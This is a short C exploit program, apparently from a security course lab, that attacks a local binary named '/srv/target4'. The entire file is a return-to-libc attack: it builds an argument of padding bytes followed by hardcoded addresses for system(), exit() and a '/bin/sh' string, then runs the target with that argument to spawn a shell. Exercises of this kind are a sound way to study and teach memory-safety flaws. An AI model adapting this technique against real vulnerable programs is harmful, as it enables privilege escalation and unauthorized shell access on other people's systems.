#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);
  for (int i = 0; i < 8; i++)
  {
    strcat(str, "\x90");
  }

  char *system = "\x60\x43\xe1\xf7";
  strcat(str, system);

  char *exit = "\xc0\x6e\xe0\xf7";
  strcat(str, exit);

  char *binsh = "\x63\xf3\xf5\xf7";
  strcat(str, binsh);

  args[0] = TARGET;
  args[1] = str; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


